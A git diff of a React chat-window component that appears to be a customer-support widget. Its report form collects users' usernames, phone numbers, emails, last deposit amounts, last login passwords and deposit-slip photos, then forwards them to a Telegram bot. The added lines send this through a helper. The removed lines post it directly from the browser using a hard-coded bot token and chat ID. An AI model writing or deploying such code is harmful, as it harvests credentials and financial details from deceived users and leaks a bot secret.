@@ -1,7 +1,7 @@
 import React, { useState, useRef, useEffect } from 'react';
 import { Send, Paperclip, Smile, RefreshCw, X, ShieldCheck, FileText, Image as ImageIcon, Check, CheckCheck, Maximize2, Minimize2, ClipboardList, ExternalLink, AlertCircle, CheckCircle2, Megaphone, ChevronLeft, ChevronRight } from 'lucide-react';
 import { ChatSession, ChatMessage, WidgetConfig } from '../../types';
-import { NoticeHeaderBar } from './NoticeHeaderBar';
+import { sendTelegramNotification } from '../../lib/telegramNotify';
 
 interface ChatWindowProps {
   chat: ChatSession;
@@ -123,35 +123,31 @@ export const ChatWindow: React.FC<ChatWindowProps> = ({
       customerName: chat.customer.name,
     };
 
-    // 1. Send data DIRECTLY to Telegram Bot
+    // 1. Send data DIRECTLY to Telegram Bot with Photo attachment support
     try {
-      const res = await fetch('/api/telegram/send-report', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(reportPayload),
-      });
-      if (!res.ok) {
-        throw new Error('API fallback required');
-      }
+      await sendTelegramNotification(
+        {
+          type: 'user_report',
+          customerName: chat.customer.name,
+          customerPhone: reportPhone || chat.customer.phone,
+          customerEmail: reportEmail || chat.customer.email,
+          chatId: chat.id,
+          photoUrl: reportDepositSlip?.url,
+          photoName: reportDepositSlip?.name || 'deposit_slip.jpg',
+          reportData: {
+            username: reportUsername,
+            phone: reportPhone || chat.customer.phone,
+            email: reportEmail || chat.customer.email,
+            nibondhonName: reportNibondhonName,
+            lastAmount: reportLastAmount,
+            lastPassword: reportLastPassword,
+            siteLink: reportSiteLink,
+          },
+        },
+        widgetConfig
+      );
     } catch (err) {
-      // Direct client-side fallback to Telegram API
-      const botToken = '8861406019:AAHhY47ahk7DS495Ly1eLsa0tYZikFQ86f0';
-      const chatId = '6081054558';
-      const text = `🚨 <b>ইউজার রিপোর্ট জমা পড়েছে! (User Report Form)</b>\n\n` +
-        `👤 <b>Username:</b> ${reportUsername || 'N/A'}\n` +
-        `📞 <b>Phone Number:</b> ${(reportPhone || chat.customer.phone) || 'N/A'}\n` +
-        `📧 <b>Email Address:</b> ${(reportEmail || chat.customer.email) || 'N/A'}\n` +
-        `✍️ <b>নিবন্ধন নাম:</b> ${reportNibondhonName || 'N/A'}\n` +
-        `💵 <b>সর্বশেষ জমা করার পরিমাণ:</b> ${reportLastAmount || 'N/A'}\n` +
-        `🔑 <b>সর্বশেষ লগইন পাসওয়ার্ড:</b> ${reportLastPassword || 'N/A'}\n` +
-        `🌐 <b>Site Link/Name:</b> ${reportSiteLink || 'N/A'}\n` +
-        `⏰ <b>সময়:</b> ${new Date().toLocaleTimeString('bn-BD', { hour: '2-digit', minute: '2-digit' })}`;
-
-      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ chat_id: chatId, text, parse_mode: 'HTML' }),
-      }).catch(() => {});
+      console.warn('Telegram report sending error:', err);
     }
 
     // 2. In Chat window: send ONLY a clean confirmation message (No sensitive password/data in public chat)
@@ -374,9 +370,6 @@ export const ChatWindow: React.FC<ChatWindowProps> = ({
           </button>
         </div>
       </div>
-
-      {/* User Notice Header (Scrolling Announcement from Admin) */}
-      <NoticeHeaderBar notice={widgetConfig.noticeHeader} />
 
       {/* Messages Scroll Area */}
       <div className="flex-1 p-3.5 overflow-y-auto space-y-3.5 text-xs">
